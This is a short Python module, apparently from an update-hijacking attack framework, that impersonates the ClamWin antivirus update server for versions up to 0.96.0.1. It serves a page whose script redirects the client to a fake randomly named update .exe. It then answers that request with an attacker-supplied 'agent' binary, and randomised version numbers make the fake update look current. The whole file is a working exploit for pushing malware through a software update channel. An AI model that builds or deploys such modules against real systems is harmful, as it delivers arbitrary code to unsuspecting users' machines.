from modules import ModuleBase


class ClamWin(ModuleBase):
    name = 'ClamWin'
    version = '1.0'
    appver = '<= 0.96.0.1'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = 'www.clamwin.com' 
    requests = [
        {   'path': '/index.php\?option\=content',
            'type': 'string',
            'method': '',
            'bin': '',
            'string': '<html><script>window.location="http://www.clamwin.com/update/clamwin-update-<%RND1%>.exe"</script></html>',
            'parse': '1',
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]
    options = {
        'version': {
            'val' : "'9.' + rand_num(1) + '.' + rand_num(1) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        },
    }
